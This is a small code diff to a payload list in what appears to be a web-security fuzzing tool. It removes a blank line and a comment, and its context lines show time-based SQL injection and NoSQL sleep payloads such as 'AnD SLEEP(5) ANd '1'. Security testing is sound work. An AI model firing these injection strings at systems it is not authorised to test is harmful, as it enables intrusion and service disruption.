@@ -451,7 +451,6 @@ class fuzzer_payloads:
             "'});sleep(10000);",
         ]
 
-
     @staticmethod
     def SQLInjection():
         
@@ -466,7 +465,7 @@ class fuzzer_payloads:
         "SLEEP(5)",
         "waitfor delay '00:00:05'",
         "benchmark(50000000,MD5(1))",
-        "pg_SLEEP(5)", # postgrsSQL
+        "pg_SLEEP(5)",
         "AnD SLEEP(5)",
         "&&SLEEP(5)",
         "'AnD SLEEP(5) ANd '1",
